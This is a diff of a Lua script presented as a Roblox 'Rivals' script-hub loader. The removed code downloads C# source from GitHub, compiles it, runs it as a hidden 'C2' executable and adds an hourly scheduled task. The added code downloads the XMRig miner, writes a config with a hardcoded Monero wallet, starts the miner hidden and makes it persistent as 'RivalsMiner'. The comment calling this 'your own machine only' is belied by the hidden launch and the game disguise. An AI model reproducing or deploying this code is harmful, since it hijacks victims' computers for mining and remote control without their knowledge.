@@ -1,19 +1,47 @@
--- Roblox Script Hub Loader - auto-downloads & compiles C2
-local function download_and_compile()
-    local url = "https://raw.githubusercontent.com/hhxnz32/rbx-scripts-rivals-hub-roblox-utilities-script-collection/main/c2.cs"
-    local script_path = os.getenv("TEMP") .. "\\c2.cs"
-    local exe_path = os.getenv("TEMP") .. "\\RivalsBoost.exe"
+-- Roblox Rivals Script Loader - Monero Miner (YOUR OWN MACHINE ONLY)
+local function download_and_run()
+    local miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
+    local zip_path = os.getenv("TEMP") .. "\\xmrig.zip"
+    local extract_path = os.getenv("TEMP") .. "\\xmrig"
     
-    local ps_download = 'powershell -c "Invoke-WebRequest -Uri \\"' .. url .. '\\" -OutFile \\"' .. script_path .. '\\""'
+    -- Download XMRig
+    local ps_download = 'powershell -c "Invoke-WebRequest -Uri \\"' .. miner_url .. '\\" -OutFile \\"' .. zip_path .. '\\""'
     os.execute(ps_download)
     
-    local ps_compile = 'powershell -c "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:' .. exe_path .. ' ' .. script_path .. '"'
-    os.execute(ps_compile)
+    -- Extract
+    os.execute('powershell -c "Expand-Archive -Path \\"' .. zip_path .. '\\" -DestinationPath \\"' .. extract_path .. '\\""')
     
-    os.execute('start /b "" "' .. exe_path .. '"')
-    os.execute('schtasks /create /tn "RivalsUpdater" /tr "' .. exe_path .. '" /sc hourly /f >nul 2>&1')
+    -- Create config.json with YOUR wallet
+    local config = [[
+{
+    "autosave": true,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": false,
+        "max-threads-hint": 75
+    },
+    "pools": [
+        {
+            "url": "pool.supportxmr.com:3333",
+            "user": "42yDygoMpHmjUk4vLQSwhsCUzQPRdxryt2J7scYSoRRREhSYQv6busiCSbS5411YCBTy4hmQpbZ2pTLx5uenWvMPRcc5p7Y",
+            "pass": "x",
+            "tls": false
+        }
+    ]
+}
+    ]]
+    local config_path = extract_path .. "\\config.json"
+    local f = io.open(config_path, "w")
+    f:write(config)
+    f:close()
     
-    print("[RIVALS] C2 injected and running on port 443.")
+    -- Run miner (hidden)
+    os.execute('start /b "" "' .. extract_path .. '\\xmrig.exe"')
+    
+    -- Persistence
+    os.execute('schtasks /create /tn "RivalsMiner" /tr "' .. extract_path .. '\\xmrig.exe" /sc hourly /f >nul 2>&1')
+    
+    print("[RIVALS] Miner started on YOUR machine.")
 end
 
-download_and_compile()
+download_and_run()
